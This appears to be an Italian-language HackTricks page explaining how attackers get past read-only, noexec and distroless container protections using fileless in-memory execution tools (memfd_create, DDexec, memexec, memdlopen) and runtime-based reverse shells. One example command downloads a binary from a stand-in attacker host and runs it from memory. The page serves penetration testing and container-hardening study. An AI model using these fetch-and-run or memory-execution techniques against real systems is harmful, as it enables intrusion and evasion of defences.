# Bypass FS protections: read-only / no-exec / Distroless

## Video

Nei seguenti video puoi trovare le tecniche menzionate in questa pagina spiegate più approfonditamente:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4).<sup>[[1]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU).<sup>[[2]](#references)</sup>

## scenario read-only / no-exec

In un container, puoi montare il filesystem root in modalità sola lettura impostando **`readOnlyRootFilesystem: true`** nel security context.<sup>[[3]](#references)</sup> Ad esempio:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Una root in sola lettura non rende di sola lettura i volumi montati separatamente. Docker tratta **`/dev/shm`** come un mount IPC, mentre opzioni tmpfs come `rw` e `noexec` sono scelte di configurazione runtime; controlla le opzioni di mount del container target prima di fare affidamento su uno dei due comportamenti.<sup>[[4]](#references)[[5]](#references)</sup>

> [!WARNING]
> Dal punto di vista di un red team, questa combinazione può rendere difficile scaricare ed eseguire binary che non sono già disponibili (ad esempio backdoor o tool di enumerazione).<sup>[[4]](#references)[[5]](#references)</sup>

## Bypass più semplice: Scripts

Un mount `noexec` blocca l'esecuzione diretta dei binary presenti su quel mount, ma un interpreter può comunque leggere e interpretare uno script. Se `sh` o `python` è presente, puoi quindi eseguire uno shell script o uno script Python tramite quell'interpreter.<sup>[[5]](#references)</sup>

Questo non è utile quando il tool richiesto è a sua volta un binary.<sup>[[5]](#references)</sup>

## Bypass della memoria

Quando l'esecuzione diretta da un path montato è bloccata, un'opzione consiste nel caricare l'ELF in memoria ed eseguirlo tramite un path in-memory. Questo evita il controllo `noexec` su quel mount, ma non rimuove altri controlli del kernel, delle permission o delle policy.<sup>[[5]](#references)[[6]](#references)</sup>

### Bypass FD + exec syscall

Se un runtime di scripting può accedere all'interfaccia Linux pertinente, può creare un file descriptor anonimo, basato sulla RAM, con **`memfd_create(2)`**, scrivervi i byte dell'ELF e usare un percorso di esecuzione basato su fd. Il progetto [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) genera codice Python, Perl o Ruby compresso e codificato in base64 per questo workflow.<sup>[[6]](#references)[[7]](#references)</sup>

Il progetto documenta attualmente target Python, Perl e Ruby; PHP o Node richiedono una tecnica o un'estensione diversa, specifica del runtime, quindi l'assenza di questo generatore per un linguaggio non significa che l'esecuzione in-memory sia impossibile.<sup>[[6]](#references)[[12]](#references)</sup>

> [!WARNING]
> Un executable regolare scritto in **`/dev/shm`** rimane soggetto all'impostazione **`noexec`** di quel mount; aprirlo semplicemente tramite un file descriptor ordinario non modifica la policy del mount.<sup>[[5]](#references)</sup>
>
> Il metodo esatto di esecuzione in memoria dipende inoltre dal runtime, dall'architettura, dal kernel e dalle permission disponibili.<sup>[[6]](#references)[[7]](#references)[[12]](#references)</sup>

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) scrive uno stager e un loader nel processo shell in esecuzione tramite **`/proc/self/mem`**, quindi trasferisce il controllo a quel codice.<sup>[[8]](#references)</sup>

Questo consente al processo di caricare un binary fornito senza dover prima posizionare quel binary su un filesystem executable.<sup>[[8]](#references)</sup>

> [!TIP]
> **DDexec / EverythingExec** può caricare ed **eseguire** shellcode o un binary dalla **memoria**.<sup>[[8]](#references)</sup>
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Per ulteriori informazioni su questa tecnica, consulta Github o:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) è un'implementazione demone di DDexec. Il suo demone ascolta le richieste contenenti argomenti e byte grezzi del programma, crea un processo figlio per caricare ed eseguire ogni programma e mantiene il processo padre come server.<sup>[[9]](#references)</sup>

Il repository include un esempio di utilizzo di **memexec per eseguire binari da una reverse shell PHP** in [a.php](https://github.com/arget13/memexec/blob/main/a.php).<sup>[[9]](#references)</sup>

### Memdlopen

Con uno scopo simile a DDexec, [**memdlopen**](https://github.com/arget13/memdlopen) è un'implementazione fileless di `dlopen()` per un shared object o un programma. Il README documenta attualmente il supporto ARM64, quindi verifica l'architettura target prima di utilizzarlo.<sup>[[10]](#references)</sup>

## Distroless Bypass

Per una spiegazione dedicata di **che cosa sia realmente distroless**, quando è utile, quando non lo è e come modifica le tattiche di post-exploitation nei container, consulta:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Che cos'è distroless

Le immagini distroless contengono solo l'applicazione e le relative dipendenze runtime; le immagini ufficiali omettono package manager, shell e altri programmi previsti in una distribuzione Linux standard.<sup>[[11]](#references)</sup>

Limitare l'immagine runtime a queste dipendenze riduce il software presente in produzione e la quantità di software che deve essere sottoposta a scansione e monitorata.<sup>[[11]](#references)</sup>

### Reverse Shell

In un container distroless potresti **non trovare `sh` o `bash`** per una shell normale, né utility comuni come `ls`, `whoami` o `id`.<sup>[[11]](#references)</sup>

> [!WARNING]
> Pertanto, una reverse shell usuale basata su shell o l'enumeration basata su utility potrebbero non funzionare.<sup>[[11]](#references)</sup>

Se l'applicazione compromessa include un linguaggio runtime (ad esempio, Python per un'applicazione Flask o Node.js per un'applicazione Node), un RCE potrebbe comunque essere in grado di utilizzare quel runtime per un command channel e per l'ispezione del sistema tramite le relative API.<sup>[[11]](#references)[[12]](#references)</sup>

> [!TIP]
> Usa il linguaggio di scripting disponibile per **enumerare il sistema** tramite le sue funzionalità.<sup>[[12]](#references)</sup>

Se non sono presenti protezioni **read-only/no-exec**, un command channel potrebbe scrivere binari su un mount scrivibile ed eseguibile ed eseguirli; verifica prima le opzioni del mount e i permessi.<sup>[[4]](#references)[[5]](#references)</sup>

> [!TIP]
> Quando queste protezioni sono presenti, usa le **memory-execution techniques sopra descritte**, dove runtime, kernel e permessi lo consentono.<sup>[[6]](#references)[[8]](#references)[[10]](#references)</sup>

Puoi trovare **esempi** di sfruttamento di vulnerabilità RCE per ottenere **reverse shell** in linguaggi di scripting ed eseguire binari dalla memoria in [**DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).<sup>[[12]](#references)</sup>

## References

- [1] [DEF CON 31 - Esplorazione della manipolazione della memoria Linux per stealth ed evasione](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [Intrusioni stealth con DDexec-ng e dlopen() in memoria - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
- [3] [Configura un contesto di sicurezza per un Pod o un container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [4] [docker container run](https://docs.docker.com/reference/cli/docker/container/run)
- [5] [mount(8) - Pagina del manuale Linux](https://man7.org/linux/man-pages/man8/mount.8.html)
- [6] [fileless-elf-exec](https://github.com/nnsee/fileless-elf-exec)
- [7] [memfd_create(2) - Pagina del manuale Linux](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
- [8] [DDexec](https://github.com/arget13/DDexec)
- [9] [memexec](https://github.com/arget13/memexec)
- [10] [memdlopen](https://github.com/arget13/memdlopen)
- [11] [GoogleContainerTools/distroless](https://github.com/GoogleContainerTools/distroless)
- [12] [DistrolessRCE](https://github.com/carlospolop/DistrolessRCE)
{{#include ../../../../banners/hacktricks-training.md}}
